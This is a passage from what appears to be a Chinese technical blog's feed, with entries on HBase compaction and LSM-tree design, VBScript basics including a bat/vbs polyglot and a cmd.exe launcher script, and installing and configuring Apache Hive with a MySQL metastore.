Compaction设置：hbase.hstore.compaction.min设置不能太小，又不能设置太大，因此建议设置为5~6；<code>hbase.hstore.compaction.max.size = RegionSize / hbase.hstore.compaction.min</code></li><li>Major Compaction设置：大Region读延迟敏感业务（100G以上）通常不建议开启自动Major Compaction，手动低峰期触发。小Region或者延迟不敏感业务可以开启Major Compaction，但建议限制流量</li></ul></li><li>优化原理<ul><li>Compaction是将小文件合并为大文件，提高后续业务随机读性能，但是也会带来IO放大以及带宽消耗问题（数据远程读取以及三副本写入都会消耗系统带宽）。正常配置情况下Minor Compaction并不会带来很大的系统资源消耗，除非因为配置不合理导致Minor Compaction太过频繁，或者Region设置太大情况下发生Major Compaction</li></ul></li><li>观察确认<ul><li>观察系统IO资源以及带宽资源使用情况，再观察Compaction队列长度，确认是否由于Compaction导致系统资源消耗过多</li></ul></li></ul><h4 id="数据本地率是否太低"><a href="#数据本地率是否太低" class="headerlink" title="数据本地率是否太低"></a>数据本地率是否太低</h4><ul><li>优化建议<ul><li>避免Region无故迁移，比如关闭自动balance、RS宕机及时拉起并迁回飘走的Region等；在业务低峰期执行major_compact提升数据本地率</li></ul></li><li>优化原理<ul><li>数据本地率：HDFS数据通常存储三份，假如当前RegionA处于Node1上，数据a写入的时候三副本为(Node1,Node2,Node3)，数据b写入三副本是(Node1,Node4,Node5)，数据c写入三副本(Node1,Node3,Node5)，可以看出来所有数据写入本地Node1肯定会写一份，数据都在本地可以读到，因此数据本地率是100%。现在假设RegionA被迁移到了Node2上，只有数据a在该节点上，其他数据（b和c）读取只能远程跨节点读，本地率就为33%（假设a，b和c的数据大小相同）</li><li>数据本地率太低很显然会产生大量的跨网络IO请求，必然会导致读请求延迟较高，因此提高数据本地率可以有效优化随机读性能。数据本地率低的原因一般是因为Region迁移（自动balance开启、RegionServer宕机迁移、手动迁移等），因此一方面可以通过避免Region无故迁移来保持数据本地率，另一方面如果数据本地率很低，也可以通过执行major_compact提升数据本地率到100%</li></ul></li></ul><h2 id="LSM设计"><a href="#LSM设计" class="headerlink" title="LSM设计"></a>LSM设计</h2><ul><li>LSM树（Log-Structured Merge Tree）存储引擎，支持增、删、读、改、顺序扫描操作。而且通过批量存储技术规避磁盘随机写入问题。当然凡事有利有弊，LSM树和B+树相比，LSM树牺牲了部分读性能，用来大幅提高写性能</li><li>LSM树的由来，在了解LSM树之前，需要对hash表和B+树有所了解<ul><li>hash存储方式支持增、删、改以及随机读取操作，但不支持顺序扫描，对应的存储系统为key-value存储系统。对于key-value的插入以及查询，哈希表的复杂度都是O(1)，明显比树的操作O(n)快，如果不需要有序的遍历数据，哈希表就是最佳选择</li><li>B+树不仅支持单条记录的增、删、读、改操作，还支持顺序扫描（B+树的叶子节点之间的指针），对应的存储系统就是关系数据库（Mysql等）。但是删除和更新操作比较麻烦</li></ul></li><li>LSM的设计思想<ul><li>将对数据的修改增量保持在内存中，达到指定的大小限制后将这些修改操作批量写入磁盘</li><li>不过读取的时候稍微麻烦，需要合并磁盘中历史数据和内存中最近修改操作，所以写入性能大大提升，读取时可能需要先看是否命中内存，否则需要访问较多的磁盘文件</li><li>极端的说，基于LSM树实现的HBase的写性能比Mysql高了一个数量级，读性能低了一个数量级</li></ul></li><li>LSM树原理<ul><li>把一棵大树拆分成N棵小树，它首先写入内存中，随着小树越来越大，内存中的小树会flush到磁盘中，磁盘中的树定期可以做merge操作，合并成一棵大树，以优化读性能</li><li>流程参考：<a href="https://github.com/msbbigdata/hbase/blob/master/notes/LSM%E6%A0%91%E6%8F%92%E5%85%A5%E5%92%8C%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C.png" target="_blank" rel="noopener">LSM树插入和合并操作</a>、<a href="https://github.com/msbbigdata/hbase/blob/master/notes/LSM%E6%A0%91%E6%9F%A5%E6%89%BE%E5%92%8C%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C.png" target="_blank" rel="noopener">LSM树查找和删除操作</a></li></ul></li><li>HBase中LSM的应用流程如下<ul><li>因为小树先写到内存中，为了防止内存数据丢失，写内存的同时需要暂时持久化到磁盘，对应了HBase的MemStore和HLog</li><li>MemStore上的树达到一定大小之后，需要flush到HRegion磁盘中（一般是Hadoop DataNode），这样MemStore就变成了DataNode上的磁盘文件StoreFile，定期HRegionServer对DataNode的数据做merge操作，彻底删除无效空间，多棵小树在这个时机合并成大树，来增强读性能</li></ul></li></ul><h2 id="HBase协处理器"><a href="#HBase协处理器" class="headerlink" title="HBase协处理器"></a>HBase协处理器</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Use Apache HBase™ when you need random, realtime read/wri
      
    
    </summary>
    
      <category term="bigdata" scheme="http://blog.aezo.cn/categories/bigdata/"/>
    
    
      <category term="db" scheme="http://blog.aezo.cn/tags/db/"/>
    
      <category term="hadoop" scheme="http://blog.aezo.cn/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Visual Basic Script</title>
    <link href="http://blog.aezo.cn/2021/07/11/lang/vbs/"/>
    <id>http://blog.aezo.cn/2021/07/11/lang/vbs/</id>
    <published>2021-07-11T12:38:00.000Z</published>
    <updated>2023-05-12T09:20:49.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>VBScript是 Visual Basic Script 的简称，即 Visual Basic 脚本语言，有时也被缩写为 VBS</li><li>VBScript 是微软开发的一种脚本语言。使用 VBScript，可通过 Windows 脚本宿主调用 COM，所以可以使用 Windows 操作系统中可被使用的程序库</li><li>VBScript 一般被用在以下个方面<ul><li>VBScript 经常被用来完成重复性的Windows 操作系统任务</li><li>用来指挥客户方的网页浏览器。在这一方面，VBS 与JavaScript 是竞争者</li></ul></li><li>VBS相关脚本参考：<a href="https://www.jb51.net/list/list_114_1.htm" target="_blank" rel="noopener">https://www.jb51.net/list/list_114_1.htm</a></li></ul><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul><li><code>&#39;</code>表示注释</li><li>不区分大小写</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li>变量声明：可以使用 <code>Dim</code>、<code>Public</code> 或 <code>Private</code> 语句来声明变量</li></ul><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'简单变量</span></span><br><span class="line"><span class="keyword">dim</span> name</span><br><span class="line">name=some value</span><br><span class="line"></span><br><span class="line"><span class="comment">'数组变量：创建了一个包含2个元素的数组</span></span><br><span class="line"><span class="keyword">dim</span> names(<span class="number">2</span>)</span><br><span class="line">names(<span class="number">0</span>)=<span class="string">"George"</span></span><br><span class="line">names(<span class="number">1</span>)=<span class="string">"John"</span></span><br><span class="line">father=names(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">'多维数组</span></span><br><span class="line"><span class="keyword">dim</span> table(<span class="number">4</span>, <span class="number">6</span>)</span><br></pre></td></tr></table></figure><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'子程序(无返回值)</span></span><br><span class="line"><span class="keyword">Sub</span> mysub(argument1,argument2)</span><br><span class="line"> some statements</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'函数程序(有返回值)</span></span><br><span class="line"><span class="keyword">Function</span> myfunction(argument1,argument2)</span><br><span class="line"> some statements</span><br><span class="line"> myfunction=some value</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'调用子程序或函数的方式</span></span><br><span class="line">name = MyProc(argument)</span><br><span class="line"><span class="keyword">Call</span> MyProc(argument)</span><br><span class="line">MyProc argument</span><br></pre></td></tr></table></figure><h3 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h3><ul><li>条件语句参考：<a href="https://www.w3school.com.cn/vbscript/vbscript_conditionals.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/vbscript/vbscript_conditionals.asp</a></li><li>循环语句参考：<a href="https://www.w3school.com.cn/vbscript/vbscript_looping.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/vbscript/vbscript_looping.asp</a></li></ul><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><ul><li>参考 <a href="https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp</a></li><li>SendKeys<ul><li>模拟键盘操作：<a href="https://www.itdaan.com/blog/2011/03/25/e598b7eaed4fd60a1379c1ea8763d167.html" target="_blank" rel="noopener">https://www.itdaan.com/blog/2011/03/25/e598b7eaed4fd60a1379c1ea8763d167.html</a></li></ul></li></ul><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><ul><li>VBScript语言提供了两个语句和一个对象来处理运行时错误<ul><li><code>On Error Resume Next</code> 语句：如果此语句后面的程序出现运行时错误时，会继续运行，不中断</li><li><code>On Error Goto 0</code> 语句：如果此语句后面的程序出现运行时错误时，会显示出错信息并停止程序的执行</li><li><code>Err</code> 对象：存储了关于运行期错误的信息<ul><li>Description 设置或返回一个描述错误的字符串</li><li>Number （缺省属性）设置或返回指定一个错误的值</li><li>Source 设置或返回产生错误的对象的名称</li><li>Clear    方法：清除当前所有的Err对象设置</li><li>Raise    方法：产生一个运行期错误</li></ul></li></ul></li></ul><h2 id="与bat结合"><a href="#与bat结合" class="headerlink" title="与bat结合"></a>与bat结合</h2><ul><li>一个 批处理 .vbs 文件，在前面加一段代码（头），就变成了 .bat 批处理，注意，没有生成临时文件</li><li><p>test.bat为例</p><ul><li>bat文件，可解析其中的vbs代码，同时执行了一段批处理和vbs，没有生成临时文件，用了大量的 hack 技巧。根推荐生成临时vbs文件的方式</li><li><p>执行bat脚本后回车会弹出一个确认框(This is vbs)</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">:On Error Resume Next</span><br><span class="line">:Sub bat</span><br><span class="line"><span class="built_in">echo</span> off &amp; <span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Batching_codez_here_following_vbs_rules &amp; <span class="built_in">pause</span> &gt;<span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span> '&gt;<span class="built_in">nul</span> &amp; <span class="built_in">start</span> "" wscript //e:vbscript "%~f0" %*</span><br><span class="line"><span class="keyword">Exit</span> Sub : End Sub</span><br><span class="line">MsgBox "This is vbs"</span><br><span class="line"><span class="keyword">for</span> each i <span class="keyword">in</span> wscript.arguments</span><br><span class="line">wscript.<span class="built_in">echo</span> i</span><br><span class="line">next</span><br></pre></td></tr></table></figure></li><li><p>说明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmd.exe 识别成一段注释</span></span><br><span class="line"><span class="comment"># wscript.exe识别方式: `:`在vbs语法里代表分行，然后 On Error Resume Next，也就是让WSH忽略一些错误</span></span><br><span class="line">:On Error Resume Next</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd.exe 识别成：echo一个 ' 到 空设备，也就是什么都不显示。&amp; 的意思是同时执行，那么同时执行了 start "" wscript //e:vbscript "%~f0" %*，也就是启动WSH，用VBS语法解析自身</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&gt;nul &amp; start "" wscript //e:vbscript "%~f0" %*</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="傻瓜式执行命令"><a href="#傻瓜式执行命令" class="headerlink" title="傻瓜式执行命令"></a>傻瓜式执行命令</h3><ul><li>将此vbs文件和<code>demo.exe</code>放到同一目录，用户只需双击vbs，会显示一个输入框，然后从其他地方复制代码到输入框进行执行</li><li><code>傻瓜式运行点击我.vbs</code></li></ul><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n=inputbox(<span class="string">"登录网站后台的查看完整的启动命令，点击确定后键入回车"</span>,<span class="string">"测试客户端"</span>,<span class="string">"demo.exe -server=xxx -key=xxx"</span>)</span><br><span class="line"><span class="keyword">If</span> n= <span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line"><span class="keyword">Set</span> ws = CreateObject(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">ws.Run <span class="string">"cmd.exe /k color 0A &amp;&amp; "</span>+n</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;VBScript是 Visual Basic Script 的简称，即 Visual Basic 脚本语言，有时也被缩写为 VB
      
    
    </summary>
    
      <category term="lang" scheme="http://blog.aezo.cn/categories/lang/"/>
    
    
      <category term="vb" scheme="http://blog.aezo.cn/tags/vb/"/>
    
      <category term="windows" scheme="http://blog.aezo.cn/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Hive</title>
    <link href="http://blog.aezo.cn/2021/06/01/bigdata/hive/"/>
    <id>http://blog.aezo.cn/2021/06/01/bigdata/hive/</id>
    <published>2021-06-01T11:58:00.000Z</published>
    <updated>2021-08-31T06:07:20.336Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>The Apache Hive ™ data warehouse software facilitates reading, writing, and managing large datasets residing in distributed storage using SQL. Structure can be projected onto data already in storage. A command line tool and JDBC driver are provided to connect users to Hive.</p></blockquote><ul><li><a href="https://hive.apache.org/" target="_blank" rel="noopener">Hive官网</a>、<a href="https://mirrors.bfsu.edu.cn/apache/hive/" target="_blank" rel="noopener">下载</a>、<a href="https://github.com/apache/hive" target="_blank" rel="noopener">源码</a></li><li>Hive是基于Hadoop的一个数据仓库工具，用来进行数据提取、转化、加载，这是一种可以存储、查询和分析存储在Hadoop中的大规模数据的机制<ul><li>hive数据仓库工具能将结构化的数据文件映射为一张数据库表，并提供SQL查询功能，能将SQL语句转变成MapReduce任务来执行</li><li><strong>hive基于hdfs做存储，基于mr进行计算(将sql语句转成mr程序)</strong></li></ul></li><li>Hive产生的原因<ul><li>方便对文件及数据的元数据进行管理，提供统一的元数据管理方式</li><li>提供更加简单的方式来访问大规模的数据集，使用SQL语言进行数据分析（无需写MapReduce程序，降低数据分析门槛）</li></ul></li><li><p>架构图</p><p>  <img src="/data/images/bigdata/hive-arch.png" alt="hive-arch.png"></p><ul><li>用户访问接口<ul><li>CLI（Command Line Interface）：用户可以使用Hive自带的命令行接口执行Hive QL(有称HQL)、设置参数等功能</li><li>JDBC/ODBC：用户可以使用JDBC或者ODBC的方式在代码中操作Hive</li><li>Web GUI：浏览器接口，用户可以在浏览器中对Hive进行操作（2.2之后淘汰）</li></ul></li><li>Thrift Server：可使用Java、C++、Ruby等多种语言运行Thrift服务，通过编程的方式远程访问Hive</li><li>Driver：是Hive的核心，其中包含解释器、编译器、优化器等各个组件，完成从SQL语句到MapReduce任务的解析优化执行过程</li><li>Metastore：Hive的元数据存储服务，一般将数据存储在关系型数据库中<ul><li>HDFS中存有大量不同类型的数据，在做MR计算时，需要知道使用的数据集和一些数据特征(如数据分割符，分割后每个字段意思)，对应Hive中表结构，因此Hive将这些元数据(表结构)单独保存</li><li>Hive的数据存储在HDFS中，大部分的查询、计算由MapReduce完成（但是包含<em>的查询，比如select </em> from tbl不会生成MapRedcue任务）</li></ul></li></ul></li><li>HiveServer2模块(主要在是提供hive查询服务给远程用户)<ul><li>HiveServer2的实现，依托于Thrift RPC，它被设计用来提供更好的支持对于open API例如JDBC和ODBC</li><li>hiveserver2不用直接将hdfs和metastore暴露给用户</li><li>有HA机制，解决应用端的并发和负载问题</li><li>HiveServer2提供了一种新的命令行接口(Beeline)，可以提交执行SQL语句</li></ul></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>元数据存储分类，参考：<a href="https://cwiki.apache.org/confluence/display/Hive/AdminManual+Metastore+Administration" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/Hive/AdminManual+Metastore+Administration</a><ul><li>使用Hive自带的内存数据库Derby作为元数据存储(一般不使用)</li><li>使用远程数据库mysql作为元数据存储</li><li>使用本地/远程元数据服务模式安装Hive，可以基于Zookeeper对Thrift server进行HA配置(一般用于生产环境)</li></ul></li><li><code>v2.3.8</code>适用于<code>Hadoop 2.x</code>(本文使用版本)，<code>v3.x</code>适用于<code>Hadoop 3.x</code></li><li>安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## **启动hdfs和yarn集群**，参考[hadoop.md#启动/停止/使用](/_posts/bigdata/hadoop.md#启动/停止/使用)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 在node01上安装mysql，略</span></span><br><span class="line">create database hive; <span class="comment"># 提前创建好元数据存储库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 在node02上安装Hive(当做Thrift server)</span></span><br><span class="line">wget https://mirrors.bfsu.edu.cn/apache/hive/hive-2.3.8/apache-hive-2.3.8-bin.tar.gz</span><br><span class="line">tar -zxvf apache-hive-2.3.8-bin.tar.gz</span><br><span class="line">mv apache-hive-2.3.8-bin hive-2.3.8</span><br><span class="line"><span class="comment"># 增加环境变量</span></span><br><span class="line">    <span class="comment"># HIVE_HOME=/opt/bigdata/hive-2.3.8</span></span><br><span class="line">    <span class="comment"># export PATH=$PATH:$HIVE_HOME/bin</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HIVE_HOME</span>/conf</span><br><span class="line"><span class="comment"># 先删除configuration中原默认配置，然后参考下文Thrift server上hive-site.xml配置</span></span><br><span class="line">cp hive-default.xml.template hive-site.xml</span><br><span class="line"><span class="comment"># 拷贝mysql-connector-java-5.1.49.jar到$HIVE_HOME/lib目录</span></span><br><span class="line">cp mysql-connector-java-5.1.49.jar <span class="variable">$HIVE_HOME</span>/lib</span><br><span class="line"><span class="comment"># ***启动Thrift server(使用root用户启动亦可，阻塞式窗口，卡住是正常现象)***。去mysql查看hive数据库已经自动创建了一些表</span></span><br><span class="line">hive --service metastore</span><br><span class="line"></span><br><span class="line"><span class="comment">## 在node03上安装Hive(当做Driver)</span></span><br><span class="line">scp -r /opt/bigdata/hive-2.3.8 root@node03:/opt/bigdata</span><br><span class="line"><span class="comment"># 同上文一样增加环境变量</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HIVE_HOME</span>/conf</span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="comment"># 配置，然后参考下文Driver上hive-site.xml配置</span></span><br><span class="line">vi hive-site.xml</span><br><span class="line"><span class="comment"># ***使用test用户(需要对hive.metastore.warehouse.dir有写入权限)执行，进入hive命令行***</span></span><br><span class="line">hive</span><br><span class="line"></span><br><span class="line"><span class="comment">## 日志所在目录</span></span><br><span class="line">cat /tmp/<span class="built_in">test</span>/hive.log</span><br></pre></td></tr></table></figure><ul><li>Thrift server上hive-site.xml配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 在hdfs中的根目录。无需提前创建，hive会自动创建 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://node01:3306/hive?useSSL=false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>root<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>Hello1234!<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 不加会报错 MetaException(message:Version information not found in metastore. ) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.schema.verification<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 自动创建表 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>datanucleus.schema.autoCreateAll<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Driver上hive-site.xml配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 在hdfs中的根目录。无需提前创建，hive会自动创建 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.uris<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>thrift://node02:9083<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.local<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用HiveServer2组件"><a href="#使用HiveServer2组件" class="headerlink" title="使用HiveServer2组件"></a>使用HiveServer2组件</h2><ul><li><p>可选。使用共享metastore server的hiveserver2模式搭建</p><ul><li><p>需先在修改Hadoop配置</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 修改hdfs的超级用户的管理权限（其中test为Hadoop启动用户），否则报错：org.apache.hadoop.security.authorize.AuthorizationException --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.test.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.test.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span 